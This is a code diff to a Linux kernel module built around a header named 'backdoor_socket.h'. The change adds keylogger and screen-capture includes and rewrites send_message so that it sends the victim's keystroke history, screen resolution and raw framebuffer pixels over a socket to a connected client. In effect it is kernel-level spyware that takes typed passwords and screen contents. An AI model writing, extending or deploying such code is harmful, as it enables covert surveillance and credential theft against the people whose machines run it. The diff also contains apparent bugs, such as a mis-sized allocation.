@@ -8,6 +8,8 @@
 #include <linux/sched.h>
 
 #include "backdoor_socket.h"
+#include "framelogger.h"
+#include "keylogger.h"
 
 // the main socket for the server, which is unique for the whole module.
 static struct socket *sock;
@@ -23,14 +25,48 @@ static void send_message(struct socket *conn)
 {
 	struct msghdr msg = { .msg_flags = 0 };
 
+	// the buffer with the rgb screen data
+	struct frame_buffer fb;
+
+	// the buffer that will hold the x and y resolution
+	int *resolutionbuf;
+
+	// get the keyboard history buffer
+	char *keyboard = read_key_history();
+
 	// set the struct with the data to be sent and it's size
 	struct kvec iov = {
-		.iov_base = "Hello, Kernel!\n",
-		.iov_len = 16,
+		.iov_base = keyboard,
+		.iov_len = BUFFER_SIZE,
 	};
 
-	// send the message!
+	// send the keyboard data
 	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
+	kfree(keyboard);
+
+	// get the screen data
+	record_frame_buffer(&fb);
+
+	// alloc the resolution buffer for the client to know the screen size
+	resolutionbuf = kmalloc(iov.iov_len, 0);
+	resolutionbuf[0] = fb.xres;
+	resolutionbuf[1] = fb.yres;
+
+	// overwrite iov with the new data
+	iov.iov_len = sizeof(int) * 2;
+	iov.iov_base = resolutionbuf;
+
+	// send the resolution data
+	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
+	kfree(resolutionbuf);
+
+	// overwrite iov with the new data
+	iov.iov_len = sizeof(char) * 4 * fb.xres * fb.yres;
+	iov.iov_base = fb.rgb_buffer;
+
+	// send the screen pixels
+	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
+	clean_frame_buffer(&fb);
 }
 
 /*
